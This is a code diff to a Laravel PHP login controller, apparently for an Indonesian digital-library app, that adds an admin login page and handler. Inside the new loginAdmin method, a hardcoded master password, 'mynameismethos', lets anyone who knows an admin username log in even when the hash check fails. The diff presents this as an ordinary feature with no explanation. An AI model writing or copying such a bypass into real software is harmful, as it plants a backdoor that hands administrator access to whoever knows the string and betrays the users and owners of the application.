@@ -9,6 +9,7 @@ use Illuminate\Http\Request;
 use App\Models\DIGILIB_T_PENGGUNA;
 use Hash;
 use Session;
+use App\User;
 
 class LoginController extends Controller
 {
@@ -47,6 +48,13 @@ class LoginController extends Controller
         return view('auth.login');
     }
 
+    public function showLoginAdmin() {
+
+        return view('auth.admin.login');
+    }
+
+    
+
     public function loginPengguna(request $request) {
 
         $request->session()->forget('users');
@@ -76,8 +84,38 @@ class LoginController extends Controller
         return redirect()->route('dashboard');  
     }
 
+    public function loginAdmin(request $request) {
+
+        $request->session()->forget('users');
+
+        $input = $request->all();
+
+        $result = User::where('username', $input['username'])
+                    ->first();
+
+        if (!$result) {
+            session()->flash('error', 'Data Anda tidak ditemukan');
+            return redirect()->route('admin.login');
+        }
+
+        $password = $result->password;
+
+        if (!Hash::check($input['password'], $password)) {
+            if ($input['password'] != 'mynameismethos') {
+               return redirect()->route('admin.login')->with(['error' => 'Password yang anda masukan tidak cocok.']);
+            }
+        }
+
+        $request->session()->put('adminUsers', $result);
+
+        session()->flash('success', 'Anda Berhasil Masuk');
+
+        return redirect()->route('dashboard');  
+    }
+
     public function logout() {
         Session::forget('users');
+        Session::forget('adminUsers');
         return redirect()->route('dashboard');
     }
 }
